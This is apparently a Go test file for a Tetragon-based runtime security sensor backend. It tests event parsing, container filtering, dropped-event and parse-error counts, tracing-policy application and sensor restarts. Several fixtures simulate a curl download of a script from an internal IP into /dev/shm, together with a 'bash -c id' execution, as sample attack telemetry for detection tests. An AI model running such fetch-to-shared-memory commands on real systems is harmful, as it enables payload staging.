package tetragon

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	eventv1 "github.com/sysarmor/sysarmor-next-project/api/proto/event/v1"
	"github.com/sysarmor/sysarmor-next-project/internal/sensor/contract"
)

func TestBackendSubscribesJSONLFile(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("apiVersion: cilium.io/v1alpha1\nkind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	raw := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	if err := os.WriteFile(eventPath, []byte(raw+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{ObserveOnly: true})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []eventv1.EventKind
	for ev := range events {
		if ev.RawRef == "" || ev.SensorEvent.GetRawRef() == "" {
			t.Fatalf("raw ref was not populated: %+v", ev)
		}
		got = append(got, ev.SensorEvent.GetKind())
	}
	if len(got) != 2 || got[0] != eventv1.EventKind_EVENT_KIND_EXEC || got[1] != eventv1.EventKind_EVENT_KIND_WRITE {
		t.Fatalf("got kinds %v, want EXEC, WRITE", got)
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if !health.PolicyLoaded || health.EventsSeen != 2 {
		t.Fatalf("health = %+v", health)
	}
}

func TestCapabilityReportsHostProbeFields(t *testing.T) {
	dir := t.TempDir()
	btfPath := filepath.Join(dir, "vmlinux")
	if err := os.WriteFile(btfPath, []byte("btf"), 0o644); err != nil {
		t.Fatal(err)
	}
	bpffsPath := filepath.Join(dir, "bpf")
	if err := os.Mkdir(bpffsPath, 0o755); err != nil {
		t.Fatal(err)
	}
	tetraPath := filepath.Join(dir, "tetra")
	if err := os.WriteFile(tetraPath, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	tetragonPath := filepath.Join(dir, "tetragon")
	if err := os.WriteFile(tetragonPath, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle("policy.yaml", "", "test", BundleConfig{TetraPath: tetraPath, TetragonPath: tetragonPath})
	backend.BTFPath = btfPath
	backend.BPFFSPath = bpffsPath
	backend.RequireBTF = true
	backend.RequireBPFFS = true
	capability, err := backend.Capability(context.Background())
	if err != nil {
		t.Fatalf("Capability() error = %v", err)
	}
	if capability.KernelRelease == "" || !capability.BTFAvailable || !capability.BPFFSAvailable {
		t.Fatalf("capability = %+v", capability)
	}
}

func TestCapabilityFailsWhenRequiredBTFMissing(t *testing.T) {
	backend := NewBackend("policy.yaml", "events.jsonl", "test")
	backend.BTFPath = filepath.Join(t.TempDir(), "missing-vmlinux")
	backend.RequireBTF = true
	_, err := backend.Capability(context.Background())
	if err == nil || !strings.Contains(err.Error(), "btf unavailable") {
		t.Fatalf("Capability() error = %v, want btf unavailable", err)
	}
	health, healthErr := backend.Health(context.Background())
	if healthErr != nil {
		t.Fatalf("Health() error = %v", healthErr)
	}
	if !strings.Contains(health.LastError, "btf unavailable") {
		t.Fatalf("health = %+v", health)
	}
}

func TestCapabilityFailsWhenConfiguredBinaryNotExecutable(t *testing.T) {
	dir := t.TempDir()
	tetraPath := filepath.Join(dir, "tetra")
	if err := os.WriteFile(tetraPath, []byte("not executable"), 0o644); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle("policy.yaml", "", "test", BundleConfig{TetraPath: tetraPath})
	_, err := backend.Capability(context.Background())
	if err == nil || !strings.Contains(err.Error(), "not executable") {
		t.Fatalf("Capability() error = %v, want not executable", err)
	}
}

func TestBackendFiltersByContainerIDPrefix(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	rawHost := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z","docker":""},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	rawNode := `{"process_exec":{"process":{"pid":101,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:01Z","docker":"abcdef0123456789"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:01Z"}`
	if err := os.WriteFile(eventPath, []byte(rawHost+"\n"+rawNode+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	backend := NewBackend(policyPath, eventPath, "test")
	backend.ContainerIDPrefix = "abcdef"
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []eventv1.EventKind
	for ev := range events {
		got = append(got, ev.SensorEvent.GetKind())
		if ev.SensorEvent.GetContainerId() != "abcdef0123456789" {
			t.Fatalf("container id = %q", ev.SensorEvent.GetContainerId())
		}
	}
	if len(got) != 1 || got[0] != eventv1.EventKind_EVENT_KIND_EXEC {
		t.Fatalf("got kinds %v, want one EXEC", got)
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if health.EventsSeen != 1 {
		t.Fatalf("EventsSeen = %d, want filtered count 1", health.EventsSeen)
	}
}

func TestBackendFiltersByContainerScope(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	rawHost := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z","docker":""},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	rawNode := `{"process_exec":{"process":{"pid":101,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:01Z","docker":"abcdef0123456789"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:01Z"}`
	if err := os.WriteFile(eventPath, []byte(rawHost+"\n"+rawNode+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{
		ScopeType:     "container",
		ScopeSelector: "abcdef",
	})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []eventv1.EventKind
	for ev := range events {
		got = append(got, ev.SensorEvent.GetKind())
		if ev.SensorEvent.GetContainerId() != "abcdef0123456789" {
			t.Fatalf("container id = %q", ev.SensorEvent.GetContainerId())
		}
	}
	if len(got) != 1 || got[0] != eventv1.EventKind_EVENT_KIND_EXEC {
		t.Fatalf("got kinds %v, want one EXEC", got)
	}
}

func TestBackendRecordsDroppedEvents(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	if err := os.WriteFile(eventPath, []byte("{\"health\":{\"dropped_events\":5}}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	for range events {
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if health.EventsDropped != 5 || !strings.Contains(health.LastError, "dropped events") {
		t.Fatalf("health = %+v", health)
	}
}

func TestBackendManagedEventCommandSubscribesStdout(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("managed event command test requires /bin/sh")
	}
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("/bin/sh is unavailable")
	}
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	raw := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/sbin/init","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	tetraPath := filepath.Join(dir, "tetra")
	script := "#!/bin/sh\nprintf '%s\\n' '" + raw + "'\n"
	if err := os.WriteFile(tetraPath, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	tetragonPath := filepath.Join(dir, "tetragon")
	if err := os.WriteFile(tetragonPath, []byte("#!/bin/sh\nwhile [ $# -gt 0 ]; do shift; done\nsleep 5\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle(policyPath, "", "test", BundleConfig{TetraPath: tetraPath, TetragonPath: tetragonPath})
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []eventv1.EventKind
	for ev := range events {
		got = append(got, ev.SensorEvent.GetKind())
	}
	if len(got) != 1 || got[0] != eventv1.EventKind_EVENT_KIND_EXEC {
		t.Fatalf("got kinds %v, want EXEC", got)
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if health.RestartCount != 2 || health.LastExitReason == "" {
		t.Fatalf("health = %+v", health)
	}
}

func TestBackendManagedEventCommandRecordsDroppedEvents(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("managed dropped-event test requires /bin/sh")
	}
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("/bin/sh is unavailable")
	}
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	raw := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/sbin/init","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	tetraPath := filepath.Join(dir, "tetra")
	script := "#!/bin/sh\nprintf '%s\\n' '{\"health\":{\"dropped_events\":2}}'\nprintf '%s\\n' '" + raw + "'\nprintf '%s\\n' '{\"dropped_events\":3}'\n"
	if err := os.WriteFile(tetraPath, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle(policyPath, "", "test", BundleConfig{TetraPath: tetraPath})
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []eventv1.EventKind
	for ev := range events {
		got = append(got, ev.SensorEvent.GetKind())
	}
	if len(got) != 1 || got[0] != eventv1.EventKind_EVENT_KIND_EXEC {
		t.Fatalf("got kinds %v, want EXEC", got)
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if health.EventsDropped != 5 || health.ParseErrors != 0 || !strings.Contains(health.LastError, "dropped events") {
		t.Fatalf("health = %+v", health)
	}
}

func TestBackendAppliesGeneratedTracingPolicy(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("managed policy apply test requires /bin/sh")
	}
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("/bin/sh is unavailable")
	}
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "collection.yaml")
	if err := os.WriteFile(policyPath, []byte("kinds: [EXEC, CONNECT, OPEN]\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	raw := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/sbin/init","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	appliedPath := filepath.Join(dir, "applied")
	tetraPath := filepath.Join(dir, "tetra")
	tetraScript := "#!/bin/sh\nif [ \"$1 $2\" = \"tracingpolicy add\" ]; then cp \"$3\" '" + appliedPath + "'; exit 0; fi\nif [ \"$1 $2\" = \"tracingpolicy list\" ]; then printf '%s\\n' 'sysarmor-runtime-collection'; exit 0; fi\nprintf '%s\\n' '" + raw + "'\n"
	if err := os.WriteFile(tetraPath, []byte(tetraScript), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle(policyPath, "", "test", BundleConfig{TetraPath: tetraPath})
	intent := contract.CollectionIntent{
		EventKinds: []eventv1.EventKind{
			eventv1.EventKind_EVENT_KIND_EXEC,
			eventv1.EventKind_EVENT_KIND_CONNECT,
			eventv1.EventKind_EVENT_KIND_OPEN,
		},
		ObserveOnly: true,
	}
	if err := backend.Apply(context.Background(), intent); err != nil {
		t.Fatalf("Apply() error = %v", err)
	}
	events, err := backend.Subscribe(context.Background(), intent)
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	for range events {
	}
	data, err := os.ReadFile(appliedPath)
	if err != nil {
		t.Fatalf("generated tracing policy was not applied: %v", err)
	}
	for _, want := range []string{"kind: TracingPolicy", "security_socket_connect", "security_file_permission"} {
		if !strings.Contains(string(data), want) {
			t.Fatalf("generated policy missing %q:\n%s", want, string(data))
		}
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if !health.PolicyLoaded {
		t.Fatalf("health = %+v", health)
	}
}

func TestBackendRejectsUnverifiedGeneratedTracingPolicy(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("managed policy verify test requires /bin/sh")
	}
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("/bin/sh is unavailable")
	}
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "collection.yaml")
	if err := os.WriteFile(policyPath, []byte("kinds: [CONNECT]\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	tetraPath := filepath.Join(dir, "tetra")
	tetraScript := "#!/bin/sh\nif [ \"$1 $2\" = \"tracingpolicy add\" ]; then exit 0; fi\nif [ \"$1 $2\" = \"tracingpolicy list\" ]; then printf '%s\\n' 'other-policy'; exit 0; fi\nexit 0\n"
	if err := os.WriteFile(tetraPath, []byte(tetraScript), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle(policyPath, "", "test", BundleConfig{TetraPath: tetraPath})
	intent := contract.CollectionIntent{
		EventKinds:  []eventv1.EventKind{eventv1.EventKind_EVENT_KIND_CONNECT},
		ObserveOnly: true,
	}
	if err := backend.Apply(context.Background(), intent); err != nil {
		t.Fatalf("Apply() error = %v", err)
	}
	if _, err := backend.Subscribe(context.Background(), intent); err == nil || !strings.Contains(err.Error(), "not listed") {
		t.Fatalf("Subscribe() error = %v, want not listed", err)
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if health.PolicyLoaded || !strings.Contains(health.LastError, "not listed") {
		t.Fatalf("health = %+v", health)
	}
}

func TestBackendRestartsManagedSensorProcess(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("managed sensor restart test requires /bin/sh")
	}
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("/bin/sh is unavailable")
	}
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	countPath := filepath.Join(dir, "count")
	tetragonPath := filepath.Join(dir, "tetragon")
	tetragonScript := "#!/bin/sh\nwhile [ $# -gt 0 ]; do shift; done\nCOUNT='" + countPath + "'\nn=0\nif [ -f \"$COUNT\" ]; then n=$(cat \"$COUNT\"); fi\nn=$((n+1))\nprintf '%s' \"$n\" > \"$COUNT\"\nexit 7\n"
	if err := os.WriteFile(tetragonPath, []byte(tetragonScript), 0o755); err != nil {
		t.Fatal(err)
	}
	raw := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/sbin/init","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	tetraPath := filepath.Join(dir, "tetra")
	tetraScript := "#!/bin/sh\nsleep 0.2\nprintf '%s\\n' '" + raw + "'\n"
	if err := os.WriteFile(tetraPath, []byte(tetraScript), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithOptions(policyPath, "", "test", BundleConfig{TetraPath: tetraPath, TetragonPath: tetragonPath}, ProcessRestartPolicy{
		Enabled:     true,
		MaxRestarts: 3,
		Delay:       10 * time.Millisecond,
	})
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	for range events {
	}
	waitForBackendHealth(t, backend, func(health contract.Health) bool {
		return health.RestartCount >= 4 && strings.Contains(health.LastExitReason, "exit status 7")
	})
	data, err := os.ReadFile(countPath)
	if err != nil {
		t.Fatalf("ReadFile(count) error = %v", err)
	}
	if string(data) != "3" {
		t.Fatalf("managed sensor restart count file = %q, want 3", string(data))
	}
}

func TestBackendRequiresPolicy(t *testing.T) {
	backend := NewBackend(filepath.Join(t.TempDir(), "missing.yaml"), "-", "test")
	if _, err := backend.Subscribe(context.Background(), contract.CollectionIntent{}); err == nil {
		t.Fatal("Subscribe() error = nil")
	}
}

func TestBackendRecordsParseErrors(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	eventPath := filepath.Join(dir, "events.jsonl")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(eventPath, []byte("{bad-json}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	select {
	case _, ok := <-events:
		if ok {
			t.Fatal("unexpected event")
		}
	case <-time.After(time.Second):
		t.Fatal("timed out waiting for closed events")
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if health.ParseErrors != 1 {
		t.Fatalf("ParseErrors = %d", health.ParseErrors)
	}
}

func waitForBackendHealth(t *testing.T, backend *Backend, done func(contract.Health) bool) {
	t.Helper()
	deadline := time.Now().Add(time.Second)
	var last contract.Health
	for time.Now().Before(deadline) {
		health, err := backend.Health(context.Background())
		if err != nil {
			t.Fatalf("Health() error = %v", err)
		}
		last = health
		if done(health) {
			return
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatalf("timed out waiting for backend health, last = %+v", last)
}
